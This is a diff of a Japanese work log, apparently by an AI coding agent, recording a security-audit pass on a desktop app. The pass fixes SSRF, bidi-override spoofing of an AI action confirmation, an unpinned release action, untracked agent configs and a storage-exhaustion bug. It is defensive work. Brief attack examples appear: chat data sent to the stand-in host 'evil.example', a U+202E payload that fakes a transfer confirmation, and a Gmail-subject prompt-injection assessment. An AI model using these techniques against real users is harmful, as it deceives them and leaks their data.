@@ -1,5 +1,24 @@
 # Service Hub — 残りの作業手順書
 
+## パス 519 (狩りの 9 回目 —— backlog の未確認 7 件を自分で測り、本物の 5 件を直す) (2026-10-14)
+
+パス 518 が `huntBacklog` に「未確認」で残した監査候補のうち 7 件 (NET-3 / SUP-3 / SUP-5 / AI 2 / AI 4 / C4 / MAIN-5) を、監査役を使わず自分で再現してから仕分けた。**5 件が本物** (うち 1 件は AI 4 を測る途中で出た隣の穴)、**2 件は欠陥ではない** (clearedBacklog へ・測った結果つき)、**C4 は再現したが C1 と同じ設計判断に依る**ので backlog に実測を書き足して残した。各修正は対照 (修正を外すと回帰検査が落ちる) で確かめ、元へ戻して md5 で照合した。
+
+- **T-033 (network · ssrf-and-credential-egress · low · NET-3)**: `isPrivateOrReservedTarget` は単一ラベルの名前のうち `INTERNAL_TLDS` の 7 語しか遮断せず、`http://printer/` / `nas` / `router` は公開と判定していた (実測)。注記自身の理由 (単一ラベルは検索ドメインの補完で解決する・公開 API を単一ラベルで呼ぶことは無い) は 7 語の外にも等しく当てはまる。生きた消費者は `safeRemoteImageSrc` (第三者 API の `avatar_url` / `thumbnail` → 利用者のブラウザの `<img>` GET) で、`printer/avatar.png` が LAN へ飛んでいた。`.` も `:` も含まない名前をすべて遮断 (`:` は IPv6 リテラルを除くため)。`example.com` / `api.github.com` / `[2606:4700::1111]` / `1.0.0.1` は今までどおり公開 (対照)。`proxy.test.ts` の標本 `notlocalhost` は `notlocalhost.example` へ (部分一致の意図は保つ)。
+- **T-034 (ai · ai-phishing · medium · AI 2)**: 書き込みの確認 (`voiceWritePreview` —— 音声の確認とコンシェルジュの確認が同じ物を読む) は `displayField` で型と天井しか見ず、U+202E (右から左へ) などの見えない字を素で `<li>` に描いていた。実測: `parseVoiceCommand` に「送金を中止\u202Eを承認 → 口座 999 へ送金」を食わせると preview の `text` に U+202E が残り、画面ではそれ以後が裏返って読める —— **見せた物と送る物が違う確認**。送る値は字面どおり (正しい) で、欺かれるのは確認だけ。`shared/escape.ts` に `INVISIBLE_UNITS` / `escapeUnits` / `escapeInvisibleUnits` を 1 つ置き (renderer の `assistantMarkdown.ts` が持っていた同じ関数をそこへ出した —— 法則 `center-then-count-callers`)、確認は天井で切ってから見える綴り (`\u202e`) へ逃がす。
+- **T-035 (supply-chain · medium · SUP-3)**: `release.yml:174` の `softprops/action-gh-release@v2` (署名鍵 4 本と `GH_TOKEN` を持つジョブ) が 2026-08-22 から可動タグのまま `UNPINNED_ALLOW` で免除されていた。**門は見逃していない —— 台帳が通していた。** 台帳の理由「このセッションからは SHA を解決できない (3 通り試した)」は GitHub の REST についてだけ真で、git プロキシは公開リポジトリの `ls-remote` を通す。実測: `refs/tags/v2` = `3bb12739c298aeb8a4eeaf626c5b8d85266b0e65` (`^{}` の行が無い = 軽量タグ) = `refs/tags/v2.6.2` (v2.x の最新)。その SHA へ固定し (`# v2.6.2`)、台帳を空にした (**空の台帳は床ではない** —— 次のタグ固定の action は鳴る)。台帳の `why` が「同じ 3 つを試し直さないこと」と書いていたので、**4 つ目の道を試す人が居なかった** —— 塞がっている理由を書くときは、何が塞がっているか (REST) を書き、何でも塞がっていると書かない。
+- **T-036 (supply-chain · low · SUP-5)**: `.claude/settings.local.json` (利用者ごとの権限の許可) と `.mcp.json` (プロジェクトの MCP サーバ · `npx -y` で最新を走らせる) が `.gitignore` に無かった (実測: `git check-ignore` が exit 1)。どちらも Claude Code が在れば自動で読み、追跡されると書いた人の許可とサーバが clone した全員のセッションで走る —— しかも `lint:mcp-servers` は `.claude/settings.json` しか見ない (法則 `config-that-picks-code-is-guarded` の外)。2 行を足し、git に訊く検査 (`check-ignore` / `ls-files`) で留めた。
+- **T-037 (main-ipc · living-off-the-land · low · AI 4 の副産物)**: `emotions/analyze-text` の抜粋は本文を 80 字で切るのに、札の `source` は `[${source}] ` と型も長さも見ずに連結していた (両ビルド)。`action:invoke` から 10 MB の `source` を 1 度渡すと抜粋がそのまま保存され、次の `readStateFile` が天井 (16 MiB) で「読めない」になり `clear-history` まで記録できない (パス 511 の `EISDIR` と同じ、1 度の呼び出しで保存先を潰す形)。文字列でなければ `[object Object]` を刷った。`shared/emotionsLimits.ts` の `analysisExcerpt` 1 つが型を見て `source` も 80 字で切り、main と `emotionsWeb` がそれを通る (正当な札は 20 字未満なので 1 字も変わらない)。
+- **MAIN-5 → cleared**: `exportPaths` の「解決後を検めて生を書く」は差を作らない。実測 (本物の fs・mkdtemp): `..` を含む生のパス 5 形は `path.resolve` の判定と `fs.writeFile` の解決が一致し、書かれたのは検めた場所だけ (根の外へ出る 2 形は safe=false)。根の中の symlink (`data/link → 外`) は字面では通るが `assertExportTargetContained` が realpath で断る (書かれたファイル 0)。
+- **AI 4 → cleared**: Gmail の件名は AI へ渡るが、永続化される解析結果は `normalizeAnalysis` が 0..1 に畳んだ 6 つの数と enum (`sentiment` / `dominant`) と 80 字の抜粋だけで、画面は `EMOTION_LABELS` で引き、抜粋は React のテキストとして描く。注入で動かせるのは分類の答えで、画面へ文を持ち込む経路は無い。測る途中で T-037 が出た。
+- **C4 (backlog のまま・実測を足した)**: `chatOllama({endpoint:'https://evil.example'})` は `https://evil.example/api/chat` へ送る (ok:true)・`https://evil.example/ollama` も同じ・`http://evil.example:11434` は `bad-endpoint` で送らない。送る前の名乗り (T-010) は「設定した Ollama (evil.example) へ送ります —— この端末の外です」と出る。根は `isAllowedOllamaBase` が任意の https を設計として許すこと (リバースプロキシのトンネルが正当) と、設定が平文の localStorage に在ること (C1)。C1 の設計判断と一緒に決める。
+
+**整合性チェーン**: `privateTarget.ts` / `escape.ts` / `assistantMarkdown.ts` / `release.yml` は保護対象 → block #293、`escape.ts` の docblock の生の U+202E を綴りへ直して block #294。
+
+**ゲートが捕まえた物 (設計どおり)**: ① `lint:charset` —— 私が heredoc で書いた検査と docblock に**生の U+202E が 12 か所**入っていた (`\u202E` と書いたつもりが実体で入った)。Trojan Source を逃がす当の検査が Trojan Source の字を素で持っていた —— 門が鳴って `\uXXXX` の綴りへ直した ② `threatLedger` —— 台帳の回帰検査の題名に `\u202e` を書くと、ソースの綴り (`\\u202e`) と JSON の綴りが一致しない。題名から逆スラッシュを外した ③ `verify:arch` —— ユニット数 17675 → **17695** (予想せず門に訊いた)。
+
+**検証**: typecheck exit 0 / `npm run verify:all` exit 0 / `chain:verify` 緑 (block #294) / 全件 `npm test` と実機は [[519-MEASURED]]。
+
 ## パス 518 (狩りの 8 回目 —— 5 面の監査役の指摘を再現し、本物だけ直す) (2026-10-14)
 
 監査役 5 面の報告を自分で再現してから直した (報告は権威を持たない)。各修正は対照 (修正を外すと回帰検査が落ちる) で確かめ、元へ戻して md5 で照合した。
